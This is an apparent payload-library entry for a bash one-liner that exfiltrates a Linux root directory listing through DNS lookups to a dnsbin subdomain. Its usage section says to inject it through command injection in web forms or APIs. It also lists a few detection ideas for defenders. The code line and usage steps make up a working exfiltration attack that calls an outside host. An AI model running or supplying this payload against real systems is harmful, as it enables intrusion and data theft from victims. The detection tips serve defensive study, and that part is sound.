---
id: 80d7c70d-9fb9-4d91-8ac4-6ce91a3bbd38
name: bash-dns-exfil-ls-root
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:57.488826+00:00'
updated_at: '2023-04-06T03:55:57.503235+00:00'
platforms:
  - Linux
tags:
  - exfiltration
  - dns
  - payload
validated: true
---

# bash-dns-exfil-ls-root

## Code

```bash
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

## Description

This bash snippet exfiltrates the listing of root directories (/ ) by iterating over `ls /` output and performing DNS lookups where each directory name is a subdomain of the dnsbin server. The data is captured and decoded on the attacker's dnsbin instance.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $SUBDOMAIN | Full subdomain from dnsbin (e.g., 3a43c7e4e57a8d0e2057.d.zhack.ca) | 3a43c7e4e57a8d0e2057.d.zhack.ca |

## Usage

Inject this code via a command injection vulnerability in a web form or API endpoint. First, start dnsbin to get the subdomain, then substitute it into the script. Run on the target Linux system to send directory names as DNS queries.

## Detection

- Monitor for repeated DNS queries from the same host to unusual subdomains.
- Log shell executions showing `host` or `nslookup` in process trees.
- Anomaly detection in DNS volume from internal IPs.

## Related

- [[procedures/DNS-Data-Exfiltration-via-Command-Injection]]
- [[tools/dnsbin]]
